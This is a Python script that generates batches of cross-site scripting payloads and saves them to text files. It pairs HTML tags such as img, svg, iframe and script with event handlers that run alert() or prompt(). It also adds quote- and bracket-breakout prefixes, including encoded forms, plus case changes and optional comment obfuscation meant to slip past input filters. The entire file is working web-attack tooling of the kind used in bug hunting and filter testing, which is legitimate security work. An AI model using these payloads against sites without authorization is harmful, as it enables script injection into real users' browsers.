import random
import argparse

parser = argparse.ArgumentParser(description="Generate payload")
parser.add_argument('-n', '--number', type=str, required=True, help='Number payload')
prefix = [
    r'">',
    r"'>\"",
    r'\">',
    r'<"',
    r'><',
    r'>"<',
    r'.\>"</.',
    r'./>%20<./',
    r'/>%20<',
    r'%20/%20>',
    r'%20">%20<',
    r'%3E%3C',
    r'Pjw='
]

# HTML Tags name
tags_properties = {
    'img': ['src', 'onerror', 'alt'],
    'script': ['src', 'type'],
    'svg': ['onload', 'onmouseover', 'style'],
    'iframe': ['src', 'onload'],
    'body': ['onload', 'onerror'],
    'input': ['value', 'onfocus', 'onchange'],
    'form': ['action', 'onsubmit'],
    'video': ['src', 'autoplay', 'onplay'],
    'audio': ['src', 'autoplay', 'onplay']
}

# List attributes
event_attributes = [
    'onload', 'onerror', 'onclick', 'onmouseover', 'onfocus', 'onchange', 'onblur', 'onsubmit',
    'oninput', 'onkeydown', 'onkeyup', 'onpaste', 'onselect', 'ontoggle'
]

additional_attributes = [
    'on', 'only', 'autofocus', 'autoplay', 'popover', 'href'
]

sub_attributes = [
    'data-info', 'data-xss', 'data-custom', 'data-test'
]
def randomize_case(text):
    return ''.join(random.choice([char.upper(), char.lower()]) for char in text)

def capitalize_first_letter(s):
    """Convert the first letter of each word to uppercase."""
    try:
        return ' '.join(word.capitalize() for word in s.split())
    except Exception as e:
        print(f"Error in capitalize_first_letter: {e}")
        return s

def add_obfuscation(payload):
    comments = ['/**/', '/*comment*/', '/*xss*/']
    obfuscated_payload = payload
    try:
        for _ in range(random.randint(1, 3)):
            comment = random.choice(comments)
            position = random.randint(0, len(obfuscated_payload) - 1)
            obfuscated_payload = obfuscated_payload[:position] + comment + obfuscated_payload[position:]
    except Exception as e:
        print(f"Error in add_obfuscation: {e}")
    return obfuscated_payload

def generate_payload():
    try:
        tag = random.choice(list(tags_properties.keys()))
        properties = tags_properties[tag]
        event_attr = random.choice(event_attributes)
        additional_attr = random.choice(additional_attributes)
        sub_attr = random.choice(sub_attributes)
        property_attr = random.choice(properties)
        
        if tag in ['script', 'iframe', 'svg','SVG','SvG','ScRIPT','sCRIPt','IfRame','IFRAME','iFrAME']:
            payload = f"<{capitalize_first_letter(tag)} {event_attr}='alert(1)' {property_attr}='alert(1)' {additional_attr}>alert()</{capitalize_first_letter(tag)}>"
        elif tag in ['video','VIDEO','Video','viDEO', 'audio','Audio','AUDIO','AuDIo']:
            payload = f"<{capitalize_first_letter(tag)} {additional_attr}='//google.com' {event_attr}='alert(2)' {property_attr}='alert(1)' {sub_attr}='test'>alert(1)</{capitalize_first_letter(tag)}>"
        else:
            payload = f"<{capitalize_first_letter(tag)} {additional_attr}='javascript:alert(3)' {event_attr}='alert(3)' {property_attr}='alert(1)' {sub_attr}='prompt(1)' />"

        payload = capitalize_first_letter(payload)
        # payload = add_obfuscation(payload)  # Uncomment if you want to use obfuscation
        
        return payload
    except Exception as e:
        print(f"Error in generate_payload: {e}")
        return ""

def generate_payload_bracket():
    try:
        tag = random.choice(list(tags_properties.keys()))
        properties = tags_properties[tag]
        event_attr = random.choice(event_attributes)
        additional_attr = random.choice(additional_attributes)
        sub_attr = random.choice(sub_attributes)
        property_attr = random.choice(properties)
        pr = random.choice(prefix)
       
        if tag in ['script', 'iframe', 'svg']:
            payload = f"{pr}<{capitalize_first_letter(tag)} {event_attr}='alert(1)' {property_attr}='alert(1)' {additional_attr}>alert(1)</{capitalize_first_letter(tag)}>"
        elif tag in ['video', 'audio']:
            payload = f"{pr}<{capitalize_first_letter(tag)} {additional_attr} {event_attr}='alert(2)' {property_attr}='alert(1)' {sub_attr}='test'></{capitalize_first_letter(tag)}>"
        elif tag in ['video', 'audio']:
            payload = f"{pr}<{capitalize_first_letter(tag)} {additional_attr} {event_attr}='alert(2)' {property_attr}='alert(1)' {sub_attr}='test'><source src=\"http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></{capitalize_first_letter(tag)}>"
        else:
            payload = f"{pr}<{capitalize_first_letter(tag)} {additional_attr}='javascript:alert(3)' {event_attr}='alert(3)' {property_attr}='alert(1)' {sub_attr}='test'/>"

        payload = capitalize_first_letter(payload)
        # payload = add_obfuscation(payload)  # Uncomment if you want to use obfuscation
        
        return payload
    except Exception as e:
        print(f"Error in generate_payload_bracket: {e}")
        return ""
args = parser.parse_args()
number = args.number
def save_payloads_to_file(filename='payloads.txt', num_payloads=int(number)):
    """Save payloads to a file."""
    try:
        with open(filename, 'w') as file:
            for _ in range(num_payloads):
                payload = generate_payload()
                if payload:
                    file.write(payload + '\n')
    except Exception as e:
        print(f"Error in save_payloads_to_file: {e}")

def save_bracket_payloads_to_file(filename='payloads_bracket.txt', num_payloads=int(number)):
    """Save bracketed payloads to a file."""
    try:
        with open(filename, 'w') as file:
            for _ in range(num_payloads):
                payload_pr = generate_payload_bracket()
                if payload_pr:
                    file.write(payload_pr + '\n')
    except Exception as e:
        print(f"Error in save_bracket_payloads_to_file: {e}")

def main():
    try:
        save_payloads_to_file()
        save_bracket_payloads_to_file()
    except Exception as e:
        print(f"Error in main: {e}")

if __name__ == "__main__":
    main()
